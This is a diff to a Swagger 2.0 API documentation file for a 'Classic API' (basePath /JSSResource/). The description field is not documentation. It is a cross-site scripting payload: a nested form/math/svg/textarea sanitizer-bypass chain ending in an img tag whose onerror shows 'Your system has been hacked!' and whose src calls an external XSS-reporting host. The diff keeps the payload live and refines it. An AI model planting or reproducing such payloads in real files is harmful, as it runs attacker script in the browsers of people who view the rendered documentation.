@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('Your system has been hacked!') src='https://xss.report/c/santiko86'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea></textarea><img onerror=alert('Your system has been hacked!') src='https://xss.report/c/santiko86'>"></form>
 
   version: production
 basePath: /JSSResource/
